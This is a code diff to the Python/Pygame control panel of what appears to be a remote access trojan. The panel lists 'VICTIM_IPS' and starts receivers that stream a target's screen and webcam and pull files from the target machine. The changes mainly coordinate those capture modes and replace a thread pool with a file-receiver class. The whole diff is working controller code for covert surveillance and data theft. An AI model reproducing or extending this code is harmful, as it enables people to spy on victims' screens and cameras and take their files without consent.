@@ -9,8 +9,8 @@ import socket
 import argparse
 import sys
 import threading
-import queue
-from concurrent.futures import ThreadPoolExecutor
+# import queue
+# from concurrent.futures import ThreadPoolExecutor
 
 from ui.components.colors import *
 from ui.components.display import Display
@@ -18,8 +18,8 @@ from ui.components.button import Button
 from ui.components.input_box import InputBox
 from ui.handlers.screen_handler import screenreceiver
 from ui.handlers.camera_handler import camerareceiver
-from ui.handlers.file_handler import receive_file
-from ui.utils.network import R_tcp
+from ui.handlers.file_handler import filereceiver
+# from ui.utils.network import R_tcp
 
 # Initialize Pygame
 pygame.init()
@@ -33,10 +33,9 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['10.10.36.107', '192.168.1.6', '192.168.1.2']
+VICTIM_IPS = ['10.10.27.93', '192.168.1.6', '192.168.1.2']
 
 # Thread pool for background tasks
-thread_pool = ThreadPoolExecutor(max_workers=4)
 
 
 class UIState:
@@ -118,6 +117,7 @@ def show_full_screen(display, options):
 
     screen_receiver = None
     camera_receiver = None
+    file_receiver = None
 
     clock = pygame.time.Clock()
 
@@ -126,7 +126,6 @@ def show_full_screen(display, options):
             if event.type == pygame.QUIT:
                 if screen_receiver:
                     screen_receiver.stop()
-                full_screen = False
                 return
             input_box.handle_event(event, options.port)
 
@@ -137,25 +136,41 @@ def show_full_screen(display, options):
                             screen_receiver.stop()
                         full_screen = False
                     elif camera_button.rect.collidepoint(event.pos):
-                        if camera_button.text == "Start Camera":
+                        if camera_button.text == "Start Camera" and (ui_state.file_sending == False) and (ui_state.screen_running == False):
+                            ui_state.camera_running = True
                             camera_button.text = "Stop Camera"
                             camera_receiver = camerareceiver(display.text, options.port + 2)
                         else:
                             camera_button.text = "Start Camera"
                             ui_state.camera_running = False
+                            if camera_receiver:
+                                camera_receiver.stop()
+                                camera_receiver = None
                     elif screen_button.rect.collidepoint(event.pos):
-                        if screen_button.text == "Start Screen":
+                        if (screen_button.text == "Start Screen") and (ui_state.camera_running == False) and (ui_state.file_sending == False):
+                            ui_state.screen_running = True
                             screen_button.text = "Stop Screen"
                             screen_receiver = screenreceiver(display.text, options.port + 1)
                         else:
                             screen_button.text = "Start Screen"
+                            ui_state.screen_running = False
                             if screen_receiver:
                                 screen_receiver.stop()
                                 screen_receiver = None
                     elif file_button.rect.collidepoint(event.pos):
-                        if file_button.text == "Receive File":
+                        if file_button.text == "Receive File" and (ui_state.camera_running == False) and (ui_state.screen_running == False):
                             file_button.text = "Receiving..."
-                            thread_pool.submit(lambda: receive_file("0.0.0.0", options.port + 3))
+                            ui_state.file_sending = True
+                            def on_transfer_complete():
+                                file_button.text = "Receive File"
+                                ui_state.file_sending = False
+                            file_receiver = filereceiver("0.0.0.0", options.port + 3, on_transfer_complete)
+                        else:
+                            file_button.text = "Receive File"
+                            ui_state.file_sending = False
+                            if file_receiver:
+                                file_receiver.stop()
+                                file_receiver = None
 
         try:
             screen.fill(WHITE)
@@ -171,12 +186,13 @@ def show_full_screen(display, options):
             # Cập nhật nội dung bên trong khung
             if screen_receiver and screen_receiver.double_buffer:
                 screen.blit(screen_receiver.double_buffer, frame_rect)
+                text_surface = font.render("", True, BLACK)
             else:
                 screen.blit(text_surface, text_rect)
             
             if camera_receiver and camera_receiver.double_buffer:
                 # Tạo Surface từ buffer camera_receiver
-
+                text_surface = font.render("", True, BLACK)
                 screen.blit(camera_receiver.double_buffer, frame_rect)
             else:
                 screen.blit(text_surface, text_rect)
@@ -205,9 +221,6 @@ def main():
     # Start status checker thread
     status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
     status_thread.start()
-
-    clock = pygame.time.Clock()
-
     while ui_state.running:
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
@@ -247,7 +260,6 @@ def main():
         pygame.display.flip()
 
     # Cleanup
-    thread_pool.shutdown(wait=False)
     pygame.quit()
 
 
